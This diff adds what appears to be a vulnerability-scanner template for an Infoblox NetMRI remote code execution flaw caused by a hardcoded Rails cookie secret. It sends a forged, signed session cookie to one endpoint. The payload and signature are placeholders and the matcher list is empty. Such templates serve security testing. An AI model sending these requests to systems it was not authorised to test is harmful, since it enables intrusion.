@@ -1,0 +1,21 @@
+id: infoblox-netmri-rails-cookie-rce
+brief:
+    title: Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key
+    by: iamnoooob
+    level: critical
+    about: Infoblox NetMRI virtual appliances before version 7.6.1 are vulnerable to remote code execution (RCE) due to the use of a hardcoded Ruby on Rails session cookie secret key. The Rails web component ...
+    label:
+        - infoblox
+        - netmri
+        - rails
+        - rce
+        - deserialization
+        - oast
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webui/gui_states/index.json'
+      head:
+        Cookie: _netmri={{urlencode(marshal_data)}}--{{signature}}
+      signs: []
